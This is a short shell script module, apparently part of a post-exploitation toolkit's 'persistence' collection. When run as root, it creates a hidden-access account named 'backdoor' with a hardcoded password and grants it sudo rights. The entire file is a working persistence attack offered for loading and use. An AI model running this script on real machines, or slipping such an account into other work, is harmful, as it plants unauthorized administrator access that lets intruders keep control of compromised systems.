# Add a backdoor user (requires root)
# Usage: load persistence/add_user.sh

print_header "Persistence: Add User"

if is_root; then
    if ! id "backdoor" >/dev/null 2>&1; then
        useradd -m -s /bin/bash backdoor
        echo "backdoor:P@ssw0rd123" | chpasswd
        usermod -aG sudo backdoor
        print_success "User 'backdoor' added with sudo rights."
    else
        print_warning "User 'backdoor' already exists."
    fi
else
    print_error "Must be root to add users."
fi
